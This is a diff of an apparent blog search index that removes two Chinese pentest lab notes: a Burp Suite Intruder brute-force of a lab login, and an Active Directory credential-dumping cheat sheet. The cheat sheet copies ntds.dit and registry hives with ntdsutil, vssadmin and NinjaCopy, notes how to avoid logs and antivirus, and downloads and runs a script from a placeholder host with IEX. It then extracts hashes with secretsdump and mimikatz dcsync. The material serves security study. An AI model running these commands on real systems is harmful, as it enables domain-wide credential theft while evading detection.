-<h5 id="3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"><a href="#3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。" class="headerlink" title="(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"></a>(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p>
-<h4 id="3-Google-Chrome设置"><a href="#3-Google-Chrome设置" class="headerlink" title="3. Google Chrome设置"></a>3. Google Chrome设置</h4><p>​    Google Chrome使用Burp Suite作为代理服务器的配置步骤如下：</p>
-<h5 id="1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面"><a href="#1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面" class="headerlink" title="(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面"></a>(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p>
-<h5 id="2-在搜索中搜索代理，点击进入"><a href="#2-在搜索中搜索代理，点击进入" class="headerlink" title="(2)  在搜索中搜索代理，点击进入"></a>(2)  在搜索中搜索代理，点击进入</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.png"></p>
-<h5 id="3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"><a href="#3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。" class="headerlink" title="(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"></a>(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。</h5><h3 id="0x03-熟悉comparer，repeater，intruder模块"><a href="#0x03-熟悉comparer，repeater，intruder模块" class="headerlink" title="0x03 熟悉comparer，repeater，intruder模块"></a>0x03 <strong>熟悉comparer，repeater，intruder模块</strong></h3><h4 id="1-comparer模块"><a href="#1-comparer模块" class="headerlink" title="1.  comparer模块"></a>1.  comparer模块</h4><h5 id="1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。"><a href="#1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。" class="headerlink" title="(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。"></a>(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.png"></p>
-<h5 id="2-此时，compare模块，上下界面多了一条记录"><a href="#2-此时，compare模块，上下界面多了一条记录" class="headerlink" title="(2)  此时，compare模块，上下界面多了一条记录"></a>(2)  此时，compare模块，上下界面多了一条记录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.png"></p>
-<h5 id="3-使用同样的方法，我们在为comparer模块添加另外的一条记录"><a href="#3-使用同样的方法，我们在为comparer模块添加另外的一条记录" class="headerlink" title="(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录"></a>(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录</h5><h5 id="4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）"><a href="#4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）" class="headerlink" title="(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）"></a>(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.png"></p>
-<h4 id="2-repeater模块"><a href="#2-repeater模块" class="headerlink" title="2.  repeater模块"></a>2.  repeater模块</h4><h5 id="1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了"><a href="#1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了" class="headerlink" title="(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了"></a>(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/14.png"></p>
-<h5 id="2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"><a href="#2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。" class="headerlink" title="(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"></a>(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/15.png"></p>
-<h4 id="3-Intruder-模块"><a href="#3-Intruder-模块" class="headerlink" title="3. Intruder 模块"></a>3. Intruder 模块</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
-<ol>
-<li><p>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</p>
-</li>
-<li><p>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</p>
-</li>
-<li><p>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
-</li>
-</ol>
-<h5 id="1-抓取登录框的数据包，并将数据包发送至Intruder模块"><a href="#1-抓取登录框的数据包，并将数据包发送至Intruder模块" class="headerlink" title="(1)  抓取登录框的数据包，并将数据包发送至Intruder模块"></a>(1)  抓取登录框的数据包，并将数据包发送至Intruder模块</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/16.png"></p>
-<h5 id="2-将需要爆破的参数标记"><a href="#2-将需要爆破的参数标记" class="headerlink" title="(2)  将需要爆破的参数标记"></a>(2)  将需要爆破的参数标记</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/17.png"></p>
-<h5 id="3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"><a href="#3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破" class="headerlink" title="(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"></a>(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/18.png"></p>
-<h5 id="4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it"><a href="#4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it" class="headerlink" title="(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it"></a>(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/19.png"></p>
-<h5 id="5-返回网页，使用-用户名hetian-密码69-成功登录"><a href="#5-返回网页，使用-用户名hetian-密码69-成功登录" class="headerlink" title="(5)  返回网页，使用 用户名hetian 密码69 成功登录"></a>(5)  返回网页，使用 用户名hetian 密码69 成功登录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/20.png"></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>实验笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>域内密码凭证获取</title>
-    <url>/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-活动目录数据库"><a href="#0x00-活动目录数据库" class="headerlink" title="0x00 活动目录数据库"></a>0x00 活动目录数据库</h3><blockquote>
-<ul>
-<li>由ntds.dit文件构成</li>
-<li>默认存储在所有域控制器上的%SystemRoot%\NTSD文件夹中</li>
-<li>只能通过域控制器进程和协议访问<br>ntds.dit：活动目录数据库，包括有关域用户、组和组成员身份的信息。它还包括域中所有用户的密码哈希值。</li>
-</ul>
-</blockquote>
-<p>为了保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。因此想要破解sam文 件与ntds.dit文件都需要拥有一个system文件。</p>
-<span id="more"></span>
-
-<p>由于Windows阻止对这些文件的标准读取或复制操作，因此必须使用特殊技术来获取副本。</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">NTDS.DIT	:	Windows<span class="symbol">\N</span>TDS<span class="symbol">\N</span>TDS.dit</span><br><span class="line">SYSTEM		:	Windows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>YSTEM</span><br><span class="line">SAM			:	Windows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>AM</span><br></pre></td></tr></table></figure>
-
-<p>PS : SAM存储当前主机用户密码哈希</p>
-<p>​        NTDS.DIT存储这域内所有用户密码哈希        </p>
-<h3 id="0x01-获取NTSD-DIT"><a href="#0x01-获取NTSD-DIT" class="headerlink" title="0x01 获取NTSD.DIT"></a>0x01 获取NTSD.DIT</h3><h4 id="Volume-Shadow-Copy-Service"><a href="#Volume-Shadow-Copy-Service" class="headerlink" title="Volume Shadow Copy Service"></a>Volume Shadow Copy Service</h4><p>Volume Shadow Copy Service (VSS) 卷影复制服务是微软从 Windows XP 开始提供的用于创建一致性的时间 点副本（也就是快照）的服务框架。</p>
-<ul>
-<li>用于数据备份 </li>
-<li>支持Windows Server 2003 及以上操作系统 </li>
-<li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间 无法确定 </li>
-<li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
-</ul>
-<h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><h5 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line"><span class="built_in">mount</span> [<span class="type">GUID</span>]			//<span class="built_in">copy</span> 完之后再执行</span><br><span class="line">unmout [<span class="type">GUID</span>]</span><br><span class="line"><span class="built_in">del</span> [<span class="type">GUID</span>]</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.png"></p>
-<h5 id="非交互式"><a href="#非交互式" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit		//创建快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit				//挂载快照</span><br><span class="line"><span class="built_in">copy</span> MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit			//复制ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit		//删除快照</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Ntdsutil-InstallFromMedia"><a href="#Ntdsutil-InstallFromMedia" class="headerlink" title="Ntdsutil-InstallFromMedia"></a>Ntdsutil-InstallFromMedia</h4><h5 id="交互式：-1"><a href="#交互式：-1" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.png"></p>
-<h5 id="非交互式-1"><a href="#非交互式-1" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ntdsutil <span class="string">&quot;activate instance ntds&quot;</span> ifm “create full C:\ntds” quit quit</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows										//查询当前系统的快照</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:									//创建快照</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds2.dit		//复制文件</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet								//删除快照</span><br><span class="line">vssadmin delete Shadows /All /quie								//删除快照</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.png"></p>
-<h5 id="mklink"><a href="#mklink" class="headerlink" title="mklink"></a>mklink</h5><p>无法直接访问 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23中的文件 </p>
-<p>可通过创建符号链接访问快照中的文件： </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mklink /d c:\test\ \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23\</span><br><span class="line"><span class="built_in">rd</span> c:\testvsc</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h4><p>Vshadow：是一个简单的指令行工具，它允许任何人创建卷影拷贝。系统默认不支持，可在<code>Microsoft Windows Software Development Kit (SDK)</code>中获得该工具。（不会被杀软杀）</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">vshadow.exe <span class="literal">-q</span>								//查询当前快照</span><br><span class="line">vshadow.exe <span class="literal">-p</span> <span class="literal">-nw</span> C:							//创建快照</span><br><span class="line"><span class="built_in">copy</span> [<span class="type">Shadow</span> <span class="type">copy</span> <span class="type">device</span> <span class="type">name</span>]\windows\ntds\ntds.dit c:\ntds.dit	//复制</span><br><span class="line">vshadow.exe <span class="literal">-dx</span>=ShadowCopySetId						//删除</span><br><span class="line">vshadow.exe <span class="literal">-ds</span>=ShadowCopyId</span><br></pre></td></tr></table></figure>
-
-<h5 id="查询快照"><a href="#查询快照" class="headerlink" title="查询快照"></a>查询快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.png"></p>
-<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.png"></p>
-<h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.png"></p>
-<h4 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h4><p>通过NinjaCopy获得域控服务器NTDS.dit文件,没有调用Volume Shadow Copy服务，所以不会产生日志文件7036。</p>
-<h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> Bypass			//修改powershell执行策略</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.png"></p>
-<h5 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> C:\Users\<span class="number">4600</span>\Desktop\<span class="built_in">Invoke-NinjaCopy</span>.ps1</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam.hive</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span></span><br><span class="line">c:\system.hive</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> C:\ntds.dit</span><br></pre></td></tr></table></figure>
-
-<h5 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam1.hive</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> c:\system1.hive</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> c:\ntds1.dit</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="0x02-解密ntds-dit"><a href="#0x02-解密ntds-dit" class="headerlink" title="0x02 解密ntds.dit"></a>0x02 解密ntds.dit</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit			//修复复制出来的数据库文件</span><br></pre></td></tr></table></figure>
-
-<h4 id="QuarkPwDump"><a href="#QuarkPwDump" class="headerlink" title="QuarkPwDump"></a>QuarkPwDump</h4><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的 用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">QuarksPwDump.exe -<span class="literal">-dump</span><span class="literal">-hash</span><span class="literal">-domain</span> -<span class="literal">-output</span> de1ay.com.txt -<span class="literal">-ntds</span><span class="operator">-file</span> ntds.dit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/8.png"></p>
-<h4 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h4><p>impacket 套件中的 secretsdump.py 脚本解密，速度有点慢</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">secretsdump.exe <span class="literal">-sam</span> sam.hive <span class="literal">-security</span> security.hive <span class="literal">-system</span> system.hive LOCAL</span><br><span class="line">secretsdump.exe <span class="literal">-system</span> system.hive <span class="literal">-ntds</span> ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/9.png"></p>
-<h4 id="NtdsAudit"><a href="#NtdsAudit" class="headerlink" title="NtdsAudit"></a>NtdsAudit</h4><p>NtdsAudit可以十分高效的破解ntds文件并将全部域用户信息导出方便查找域用户状态。 将ntds.dit文件和SYSTEM文件放在同一目录下执行命令</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe <span class="string">&quot;ntds.dit&quot;</span> <span class="literal">-s</span> <span class="string">&quot;system.hive&quot;</span> <span class="literal">-p</span> pwdump.txt -<span class="literal">-users</span><span class="literal">-csv</span> users.csv</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/10.png"></p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>使用Mimikatz的<code>dcsync</code>功能，可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:de1ay.com /user:mssql			//获取单个用户的详细信息</span><br><span class="line">lsadump::dcsync /domain:de1ay.com /all /cvs			//获取所有用户</span><br><span class="line">mimikatz lsadump::lsa /inject					//查看所有用户的详细信息</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/11.png"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -1843,8 +1843,8 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>渗透测试</tag>
+        <tag>Web</tag>
         <tag>信息收集</tag>
       </tags>
   </entry>
